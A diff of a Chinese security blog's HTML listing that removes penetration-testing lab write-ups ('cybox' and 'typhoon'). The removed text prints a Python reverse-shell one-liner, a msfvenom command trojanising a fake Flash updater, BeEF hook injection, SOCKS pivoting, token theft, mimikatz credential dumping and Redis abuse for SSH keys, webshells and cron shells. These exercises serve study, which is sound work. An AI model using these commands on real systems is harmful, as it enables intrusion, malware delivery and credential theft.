-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;攻击ip&#x27;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line"><span class="comment">##在这个靶机中因为设置了iptables白名单有严格的out和input链，反弹只能从21，25，80，443端口。</span></span><br></pre></td></tr></table></figure>
-<img src="/images/bj/cybox-shell-1.png">
-
-<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>​        利用github中找到的<a target="_blank" rel="noopener" href="https://www.github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh">smart-linux-enum</a>，使用该脚本进行枚举/信息收集，查找可以提权的点。</p>
-<p>​        发现可疑<code>/opt/registerlauncher</code>程序，在同目录下发现源码，查阅后发现该源码为register页面结合看到的<code>hahah用户</code>判断此功能为注册页面<code>register</code>的功能实现，尝试创建多个用户后发现用户<code>sudo</code>可以执行任意sudo命令，以<code>sudo su</code>命令提权ROOT成功。在该靶机查看<code>/etc/sudoers</code>文件发现用户组<code>%admin</code>和<code>%sudo</code>拥有sudo权限，创建sudo用户的同时，sudo也在sudo同名组。</p>
-<img src="/images/bj/cybox-shell-2.png">
-
-<img src="/images/bj/cybox-root-1.png">
-
-<img src="/images/bj/cybox-root-2.png">
-
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>​        发现该机器存在白名单的iptables限制，本意不打算修改。该系统为目标的公司系统，控制了web系统后修改web页面的php文件增加beef的hook,横向扩展使用msf联动beef的方式进行。</p>
-<img src="/images/bj/cybox-iptables.png">
-
-<h3 id="beef文件修改"><a href="#beef文件修改" class="headerlink" title="beef文件修改"></a>beef文件修改</h3><p>修改beef的配置文件，此处只做示例，详细情况根据自己的环境和想法修改。beef配置文件采用yaml格式，内部有注释，通俗易懂。</p>
-<ul>
-<li>extension扩展打开</li>
-<li>修改默认用户/密码</li>
-<li>修改默认文件名/路径</li>
-<li>修改默认端口</li>
-</ul>
-<p>默认kali环境下路径为</p>
-<p><code>/usr/share/beef-xss/config.yaml</code></p>
-<p>在最后的扩展部分找到msf设置为true，其余的端口密码，路径文件名全都在该文件中，看注释或者单词名即可。篇幅原因就不粘贴出来了。</p>
-<p><code>/usr/share/beef-xss/extensions/metasploit/config.yaml</code></p>
-<p>在第二张截图是msf扩展部分，其中端口是msf默认的api接口，beef会和这个端口通讯，其中账户和密码也是默认的，可以修改，也可以不改。后续在msf加载的时候同步修改即可。最下面一部分需要根据自己的msf安装路径进行填写，需要让beef找到msf。</p>
-<p>修改配置完成之后需要先打开msf，执行<code>load msgrpc ServerHost=XXXXX Pass=XXXXX</code>,加载成功后打开beef，beef默认需要ROOT执行，msf也必须以ROOT执行，我在不同权限启动的时候出现了报错，可能会无法访问msf的api接口，最新版msf以ROOT权限启动使用kali系统自身的postgresql。</p>
-<img src ="/images/bj/beef-1.png">
-
-<img src ="/images/bj/beef-2.png">
-
-<h3 id="fake-flash更新"><a href="#fake-flash更新" class="headerlink" title="fake-flash更新"></a>fake-flash更新</h3><p>​        在主页修改完成之后，在beef中即可看到用户上线，执行keylogger记录后，可以查看到用户的基本情况，以及在当前页面的键盘记录。我们模拟用户在域PC上面进行登陆，访问自己的<code>register.cybox.company</code>我们操作beef进行更新提示，诱导用户下载执行自己的恶意flash.exe程序。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -x flashplayer_32_ax_debug.exe -k -p windows/meterpreter/reverse_tcp lhost=XXXX lport=XXX -e x86/shikata_ga_nai -i 3 -b <span class="string">&quot;\x00&quot;</span> -f exe -o flashplayer.exe</span><br><span class="line">首先在网络上找到一个flash的更新程序，利用msfvenom程序将木马捆绑在该程序上，<span class="string">&#x27;-k&#x27;</span>选项的意思是不影响flash程序的本身功能，<span class="string">&#x27;-e -i&#x27;</span>执行3次编码，<span class="string">&#x27;-b&#x27;</span>是将可能影响程序的坏字符\x00剔除，这么制作完之后不能使用upx加壳。也可以用msfvenom 制作shellcode加载的方式。</span><br></pre></td></tr></table></figure>
-<img src="/images/bj/muma-2.png">
-
-
-
-<img src ="/images/bj/beef-3.png">
-
-
-
-<img src ="/images/bj/beef-4.png">
-
-<img src ="/images/bj/beef-5.png">
-
-<p>​        也可以利用 msf的autopwn模块联动beef的点击劫持自动化攻击访问者的浏览器，autopwn会根据访问者的浏览器自动进行exp利用。</p>
-<img src ="/images/bj/jobs-1.png">
-
-<h3 id="UAC限制"><a href="#UAC限制" class="headerlink" title="UAC限制"></a>UAC限制</h3><p>​        正好顺着这个，用令牌窃取的方式获取域管理员权限。后续用管理员查看后发现本机的UAC设置开启的最高级别。</p>
-<img src ="/images/bj/uac.png">
-
-<img src ="/images/bj/uac-2.png">
-
-<img src ="/images/bj/muma-3.png">
-
-<h3 id="获取shell-douser"><a href="#获取shell-douser" class="headerlink" title="获取shell-douser"></a>获取shell-douser</h3><img src ="/images/bj/muma-4.png">
-
-<h3 id="proxy-chain代理"><a href="#proxy-chain代理" class="headerlink" title="proxy chain代理"></a>proxy chain代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s XXXX/24</span><br><span class="line">获取本机网段，添加路由。</span><br><span class="line">background 返回主页面</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvhost XXXX 本机IP</span><br><span class="line">socks中还有端口，账户，密码。都可以选择性更改。</span><br><span class="line">最终的socks服务器将会把所有流量代理进这个meterpreter会话，使用这个通讯连接转发。</span><br></pre></td></tr></table></figure>
-<img src ="/images/bj/pr.png">
-
-<h3 id="MS17-010漏洞"><a href="#MS17-010漏洞" class="headerlink" title="MS17-010漏洞"></a>MS17-010漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sV --top-ports 3000 XXXXX -Pn -T4</span><br><span class="line">proxychains nmap -sV -p445 -iL ip.txt  -Pn --script smb-vuln-ms17-010</span><br></pre></td></tr></table></figure>
-<img src ="/images/bj/proxychain1.png">
-
-<img src="/images/bj/ms17-010.png">
-
-<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>​        kiwi_cmd就是执行mimikatz的命令，在msf中加载需要load kiwi。使用incognito令牌窃取，域管理员登陆过这台机器之后即可窃取，域管理员身份令牌。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">list_tokens -u  <span class="comment">##查看当前内存中的令牌</span></span><br><span class="line">impersonate_token DEMO\\Administrator <span class="comment">##窃取域管理员令牌</span></span><br><span class="line">chcp 65001 <span class="comment">## 切换英文，中文乱码</span></span><br><span class="line">net view <span class="comment">##查看网内计算机名</span></span><br><span class="line">nbtstat -A IP <span class="comment">## 根据IP查计算机名，在这里我们dc也是dns。没有dns解析找不到dc的。</span></span><br><span class="line">dir \\DC\C$ <span class="comment">##以域管理员身份对DC执行dir命令</span></span><br><span class="line">kiwi_cmd -f lsadump::sam  <span class="comment">###查看本地sam账户密码库</span></span><br><span class="line">kiwi_cmd -f kerberos::list <span class="comment">###列出kerberos</span></span><br></pre></td></tr></table></figure>
-<img src="/images/bj/incognito-1.png">
-
-<img src="/images/bj/kiwi-3.png">
-
-<img src="/images/bj/in.png">
-
-<img src="/images/bj/kiwi-2.png">
-
-<img src="/images/bj/kiwi-4.png">
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习一年多的一只新菜鸟，上文有任何错误之处请各位大哥尽情指出，还需要和各位前辈多多学习。<br>Freebuf:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/260602.html">https://www.freebuf.com/articles/web/260602.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
       <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E7%BC%9D%E5%90%88%E6%80%AA%E6%89%93%E7%BC%9D%E5%90%88%E9%9D%B6%E5%9C%BA.html" rel="prev" title="缝合怪打缝合靶场">
+      <i class="fa fa-chevron-left"></i> 缝合怪打缝合靶场
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dnie9.com/typhoon.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/logo.png">
-      <meta itemprop="name" content="D9">
-      <meta itemprop="description" content="谁人与我共黄昏…">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D9‘s 学习之路~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/typhoon.html" class="post-title-link" itemprop="url">Typhoon有感</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-01-06 18:42:00" itemprop="dateCreated datePublished" datetime="2021-01-06T18:42:00+08:00">2021-01-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-07 14:03:31" itemprop="dateModified" datetime="2021-01-07T14:03:31+08:00">2021-01-07</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        记录了<code> typhoon 靶机</code> 的多种利用姿势，某次发现苹果吃不到苹果的有感而发，因此较多篇幅描述了<strong>redis未授权漏洞</strong>利用方法。发现漏洞和成功利用漏洞不是一回事，实战中的复杂情形可能自己人都不熟悉自己做了什么策略。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>​        查看本机虚拟机网卡，使用<code>arp-scan</code>进行同网段存活探测。当然<code>nmap -sP</code> 进行icmp存活也都可以。</p>
-<img src="/images/typhoon/vmnet8.png" alt="image-20210106100325394" style="zoom:80%;" />
-
-<img src="/images/typhoon/arp-scan.png" alt="arp-scan" style="zoom: 80%;" />
-
-<p>​        <code>nmap</code>进行Top-3000端口的扫描探测。</p>
-<img src="/images/typhoon/nmap-sc-3000.png" style="zoom:80%;"  >
-
-<h3 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h3><h4 id="SSH免密登陆"><a href="#SSH免密登陆" class="headerlink" title="SSH免密登陆"></a>SSH免密登陆</h4><p>​        生成SSH公私钥对，将公钥放入redis的<code>key:value</code>中，执行save写入**<code>$HOME/.ssh/authorized_keys</code>**,需要有对应的写入权限，需要有对应的目录。如果Redis是ROOT用户起的进程，写入权限是都没有问题的，如果不是需要猜用户名。在实战中会遇到严格基线要求的情况，即便redis以ROOT起来，但是<code>/etc/ssh/sshd_config</code>中禁止了ROOT登陆，写入公钥后也是没办法登陆的。</p>
-<img src ="/images/typhoon/gen-pub.png" style="zoom:80%;" >
-
-<img src="/images/typhoon/gen-pub2.png">
-
-<p>​                                                                        加入“\n”的目的是为了不和脏数据混在一起</p>
-<img src="/images/typhoon/pub-done.png">
-
-<img src ="/images/typhoon/pub-wirted.png" style="zoom: 50%;" >
-
-<img src ="/images/typhoon/pub-login-sucess.png" style="zoom:80%;" >
-
-<p>​                                                <strong>配置文件将<code>permitrootlogin</code>修改为no</strong>则无法免密登陆</p>
-<img src="/images/typhoon/no-root-ssh-etc.png">
-
-<img src ="/images/typhoon/no-root-ssh2.png">
-
-<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>​        若服务器中存在web服务，而且知道绝对路径可以通过上述方式进行一句话木马写入，过程雷同。但是以ROOT进程起来的redis写入的文件属主和属组也是ROOT，这就涉及到了服务器账户默认文件的<code>umask</code>设置，在基线要求严格的系统中ROOT创建的文件，非属主属组的用户是没有权限的，默认是“660”.以本文为例，创建一句话木马文件后需要增加文件的读取权限，因为web进程是<code>www-data</code>用户起来的。</p>
-<img src="/images/typhoon/webshell-1.png">
-
-<img src="/images/typhoon/webshell-2.png">
-
-<img src="/images/typhoon/webshell-4.png">
-
-<img src ="/images/typhoon/webshell-5.png">
-
-<img src ="/images/typhoon/webshell8.png" style="zoom:50%;" >
-
-<img src="/images/typhoon/webshell-7.png" style="zoom: 50%;" >
-
-<p>​                                        <strong>将R权限增加后可以连接webshell</strong></p>
-<img src="/images/typhoon/webshell-10.png">
-
-<h4 id="计划任务利用获取shell"><a href="#计划任务利用获取shell" class="headerlink" title="计划任务利用获取shell"></a>计划任务利用获取shell</h4><p>​        需要redis以ROOT用户起进程，否则没有权限写入<code>/var/spool/cron/crontabs/</code>，其实常用的<code>crontab -e</code>就是在这个目录下生成一个相同用户名的文件，文件中就是计划任务的内容。我们利用的方式和上述一样，去写同名用户的文件然后<code>cron服务</code>去执行我们写入的命令。</p>
-<img src ="/images/typhoon/crontab-1.png">
-
-<p>​                    <strong>非ROOT用户虽然也可以用<code>crontab -e</code>建立自己的计划任务，但是非ROOT用户不能写这个目录</strong></p>
-<img src="/images/typhoon/crontab-5.png">
-
-<p>​        当存在漏洞的服务器无法写入公私钥匙，没有web服务，而且不出网，如果是ROOT起来的还能顽抗一下，用crontab写计划任务执行一些操作。下面列出了使用<code>nc</code>进行本地转bash的操作，如果nc没有**-e**选项也可以利用管道符进行操作，不过在实战中的效果就不知道了，一些严格的服务器禁止起监听端口，访问敏感二进制文件。在<code>$HOME/.bashrc</code>这个文件其实也可以写一个<code>alias</code>的别名，利用一下下，不过得人家操作才行,这个文件有R权限也可以生效<code>alias</code>……(自己瞎猜瞎搞的勿喷)</p>
-<img src ="/images/typhoon/crontab-9.png">
-
-<img src="/images/typhoon/bashrc-2.png">
-
-<img src="/images/typhoon/bashrc-lc.png" style="zoom: 80%;" >
-
-
-
-<p>redis漏洞利用还有主从复制，这个没有去搞，主从复制时利用扩展植入恶意的.so文件，实现命令执行。这些可以参考网上大佬们的文章。</p>
-<h3 id="SSH枚举-爆破密码-SUDO滥用提权"><a href="#SSH枚举-爆破密码-SUDO滥用提权" class="headerlink" title="SSH枚举-爆破密码-SUDO滥用提权"></a>SSH枚举-爆破密码-SUDO滥用提权</h3><p>​        对SSH端口进行协议识别，然后使用msf的username枚举模块发现有效用户，然后hydra爆破有效密码，最后使用SUDO滥用提权到ROOT，SUDO是指普通用户可以使用ROOT权限执行某些命令，以sudo调用su，这样输入sudoers用户的密码即可，sudo bash，都可以使用<code>sudo -l</code>可以查看。</p>
-<img src="/images/typhoon/ssh-1.png" style="zoom:80%;" >
-
-<img src="/images/typhoon/ssh.png">
-
-<img src="/images/typhoon/ssh-2.png">
-
-<img src="/images/typhoon/ssh-3.png">
-
-<img src="/images/typhoon/ssh-4.png">
-
-<h3 id="FTP爆破-上传webshell-内核漏洞提权"><a href="#FTP爆破-上传webshell-内核漏洞提权" class="headerlink" title="FTP爆破-上传webshell-内核漏洞提权"></a>FTP爆破-上传webshell-内核漏洞提权</h3><p>​        针对FTP21端口使用hydra进行爆破，登陆之后在web目录写入php木马，登陆之后查看内核版本信息利用漏洞提权编译之后成功执行为ROOT。</p>
-<img src="/images/typhoon/ftp-1.png">
-
-<img src="/images/typhoon/ftp-2.png">
-
-<img src="/images/typhoon/ftp-3.png">
-
-<img src="/images/typhoon/ftp-4.png">
-
-<img src="/images/typhoon/ftp-5.png">
-
-<h3 id="phpmoadmin-账号密码泄露-crontab提权"><a href="#phpmoadmin-账号密码泄露-crontab提权" class="headerlink" title="phpmoadmin-账号密码泄露-crontab提权"></a>phpmoadmin-账号密码泄露-crontab提权</h3><p>​        访问web服务下的<code>robots.txt</code>发现敏感目录，访问之后获得typhoon用户的账户密码，然后在当前用户的可写脚本中找到了ROOT用户执行的但是当前用户可写的脚本文件，我们在这个可写脚本中增加恶意命令，当ROOT执行后成功反弹ROOT-SHELL.<code>find / -perm -2 -type f 2&gt; / dev / null</code>查找可以写的文件.</p>
-<img src="/images/typhoon/phpmoadmin-1.png">
-
-<img src="/images/typhoon/phpmoadmin-2.png">
-
-<img src="/images/typhoon/phpmoadmin-3.png">
-
-<h3 id="tomcat默认密码-上传war包getshell"><a href="#tomcat默认密码-上传war包getshell" class="headerlink" title="tomcat默认密码-上传war包getshell"></a>tomcat默认密码-上传war包getshell</h3><p>​        tomcat默认管理页面使用默认密码<code>tomcat</code>登录之后可以部署恶意war包获取shell，msf有可以直接使用的exp模块。</p>
-<img src="/images/typhoon/tomcat-1.png">
-
-<img src="/images/typhoon/tomcat-2.png">
-
-<img src="/images/typhoon/tomcat-3.png">
-
-<img src="/images/typhoon/tomcat-4.png">
-
-<h3 id="lotucms-eval危险函数-命令执行"><a href="#lotucms-eval危险函数-命令执行" class="headerlink" title="lotucms-eval危险函数-命令执行"></a>lotucms-eval危险函数-命令执行</h3><p>​        使用nikto获取目标信息，然后访问目标站点，查看页面html源码对已知信息搜索然后利用msf中已有的对应exp模块获取shell。</p>
-<img src="/images/typhoon/lotucms-1.png">
-
-<img src="/images/typhoon/lotucms-2.png">
-
-<img src="/images/typhoon/lotucms-3.png">
-
-<img src="/images/typhoon/lotucms-4.png">
-
-<h3 id="durpal8可利用漏洞getshell"><a href="#durpal8可利用漏洞getshell" class="headerlink" title="durpal8可利用漏洞getshell"></a>durpal8可利用漏洞getshell</h3><img src="/images/typhoon/durpal8-1.png">
-
-<img src="/images/typhoon/durpal8-2.png">
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        有任何错误烦请指出（勿喷…）</p>
-<p>​        <strong>文章所有内容仅限于学习交流，任何违法犯罪行为后果自负，与本人无关！！</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dnie9.com/20210101-share.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/logo.png">
-      <meta itemprop="name" content="D9">
-      <meta itemprop="description" content="谁人与我共黄昏…">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D9‘s 学习之路~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/20210101-share.html" class="post-title-link" itemprop="url">新年快乐～</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-01-01 00:00:00 / 修改时间：01:12:11" itemprop="dateCreated datePublished" datetime="2021-01-01T00:00:00+08:00">2021-01-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>202</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="新年快乐～～"><a href="#新年快乐～～" class="headerlink" title="新年快乐～～"></a>新年快乐～～</h1><p>​    第一次使用博客，一个入行一年的菜鸟。将自己学习过程中在互联网上看到的前辈们的文章整理成了OneNote笔记，需要请自取，筛选查找方便很多～～<br>笔记中的所有内容均来自互联网，源于互联网，分享互联网。（希望后续自己坚持下去进行原创）笔记中有一部分靶机’<em>typhoon</em>‘自己搞了搞。</p>
-<p>下面是<em>OneNote</em>链接：</p>
-<p><a target="_blank" rel="noopener" href="https://1drv.ms/u/s!AlxR4H6rhRAyjhGO15U3HXx9eLt_">安全学习</a><br><a target="_blank" rel="noopener" href="https://1drv.ms/u/s!AlxR4H6rhRAyjhM7dFIzpSts09fG">分析溯源</a><br><a target="_blank" rel="noopener" href="https://1drv.ms/u/s!AlxR4H6rhRAyjh1p5vOQdRLgiVJf">安全入门</a></p>
-<p><strong>上述内容仅限于学习交流使用，进行的一切违法犯罪活动与本人无关！！！</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -797,6 +323,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Python3%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-%E4%BF%A1%E6%81%AF%E8%87%AA%E5%8A%A8%E6%8A%93%E5%8F%96%E9%82%AE%E4%BB%B6%E9%80%9A%E7%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">Python3实现安全漏洞&#x2F;信息自动抓取邮件通知</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
